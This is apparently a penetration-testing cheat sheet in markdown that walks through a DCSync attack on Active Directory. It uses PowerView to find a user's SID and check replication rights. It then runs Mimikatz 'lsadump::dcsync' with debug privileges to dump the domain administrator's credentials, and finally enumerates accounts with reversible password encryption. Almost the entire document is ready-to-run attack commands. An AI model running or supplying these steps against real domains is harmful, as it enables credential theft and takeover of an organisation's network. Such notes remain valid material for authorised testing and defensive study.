---
legal-banner: true
---

### **Step 1. Define User’s SID and Check Replication Rights**

1. Import the PowerView module:  
   ```powershell
   Import-Module PowerView
   ```

2. View the group membership of a user (e.g., `adunn`):  
   ```powershell
   Get-DomainUser -Identity [USERNAME] | select samaccountname, objectsid, memberof, useraccountcontrol | fl
   ```

3. Define the user’s SID (Security Identifier). Replace the placeholder with the actual SID of the user you are investigating:  
   ```powershell
   $sid = "S-1-5-21-1234567890-9876543210-4567891230-5678"
   ```

4. Check if the user has replication rights for the specified domain:  
   ```powershell
   Get-ObjectAcl -Identity "DC=EXAMPLE,DC=LOCAL" -ResolveGUIDs |
       Where-Object { ($_.ObjectAceType -match 'Replication-Get') } |
       Where-Object { $_.SecurityIdentifier -match $sid } |
       Select-Object AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl
   ```

### **Step 2. Performing the DCSync Attack**

5. Open a PowerShell session as the user with DCSync privileges:  
   ```bash
   runas /netonly /user:EXAMPLE\[USERNAME] powershell
   ```

6. Run Mimikatz:  
   ```bash
   .\mimikatz.exe
   ```

7. Enable debug privileges:  
   ```bash
   mimikatz # privilege::debug
   ```

8. Execute DCSync:  
   ```bash
   mimikatz # lsadump::dcsync /domain:EXAMPLE.LOCAL /user:EXAMPLE\administrator
   ```

### **Step 3. Additional Enumeration**

9. Check if any user accounts have the reversible encryption option enabled:  
   ```powershell
   Get-DomainUser -Identity * | 
       ? { $_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*' } | 
       select samaccountname, useraccountcontrol
   ```

10. Enumerate accounts with reversible encryption using `Get-ADUser`:  
   ```powershell
   Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
   ```